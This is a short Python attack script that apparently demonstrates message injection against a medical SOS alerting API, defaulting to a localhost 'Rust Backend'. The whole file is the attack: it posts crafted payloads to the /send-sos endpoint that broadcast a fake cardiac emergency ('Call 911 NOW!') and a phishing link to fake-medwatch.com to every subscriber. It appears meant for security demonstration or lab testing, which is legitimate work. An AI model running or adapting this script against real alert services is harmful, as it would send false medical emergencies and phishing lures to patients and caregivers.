#!/usr/bin/env python3
"""
Message Injection Attack on SNS

Demonstrates injection vulnerabilities via HTTP API.
"""

import requests
import argparse

class MessageInjectionAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        
    def inject_fake_emergency(self):
        print("\n[*] Attack: Fake Emergency Message Injection")
        print("="*60)
        
        payload = {
            "patient_id": "FAKE_001",
            "metric_type": "heart_rate",
            "value": 180,
            "threshold": 100,
            "custom_message": """
FAKE EMERGENCY 

Patient COLLAPSED! Call 911 NOW!

This is a FAKE message demonstrating injection vulnerability.
            """
        }
        
        response = requests.post(f"{self.target_url}/send-sos", json=payload)
        
        if response.status_code == 200:
            print("[+] INJECTION SUCCESSFUL!")
            print("[+] Fake emergency sent to all subscribers")
        else:
            print(f"[-] Failed: {response.status_code}")
            
    def inject_phishing(self):
        print("\n[*] Attack: Phishing Message Injection")
        print("="*60)
        
        payload = {
            "patient_id": "PHISH",
            "metric_type": "oxygen_saturation",
            "value": 85,
            "threshold": 90,
            "custom_message": """
MEDWATCH ALERT

Your account requires verification!
Click: http://fake-medwatch.com/verify

PHISHING ATTEMPT - DO NOT CLICK!
            """
        }
        
        response = requests.post(f"{self.target_url}/send-sos", json=payload)
        
        if response.status_code == 200:
            print("[+] PHISHING INJECTION SUCCESSFUL!")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='http://localhost:5001')
    parser.add_argument('--attack', choices=['fake', 'phishing', 'all'], default='all')
    args = parser.parse_args()
    
    print("""
    ------------------------------------------------------
       SNS Message Injection - Against Rust Backend      
    ------------------------------------------------------
    """)
    
    attacker = MessageInjectionAttack(args.target)
    
    if args.attack in ['fake', 'all']:
        attacker.inject_fake_emergency()
        
    if args.attack in ['phishing', 'all']:
        attacker.inject_phishing()

if __name__ == '__main__':
    main()
